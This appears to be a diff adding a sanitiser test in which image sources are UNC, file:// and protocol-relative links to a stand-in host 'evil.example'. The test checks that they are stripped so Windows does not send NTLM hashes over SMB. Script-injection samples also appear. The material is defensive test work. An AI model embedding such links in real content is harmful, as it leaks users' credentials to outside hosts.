@@ -82,6 +82,16 @@ describe("print sanitising: a document can never run code", () => {
     const out = html('<div><p><span onmouseover="x"><script>bad()</script>safe</span></p></div>');
     expect(out).toBe("<div><p><span>safe</span></p></div>");
   });
+
+  // BUGS.md SEC-2: loading `\\host\share\x.png` makes Windows connect to that host
+  // over SMB/WebDAV and send the user's NTLM hash. Only the document's own server
+  // should be reachable.
+  it("SEC-2: does not load an image from another network host", () => {
+    for (const src of ["\\\\evil.example\\s\\x.png", "file://evil.example/s/x.png", "//evil.example/s/x.png"]) {
+      expect(html(`<img src="${src}">`), src).toBe("<img>");
+    }
+    expect(html('<img src="\\\\nas\\pics\\x.png">', "\\\\nas\\notes")).toContain("asset://");
+  });
 });
 
 describe("what gets printed", () => {
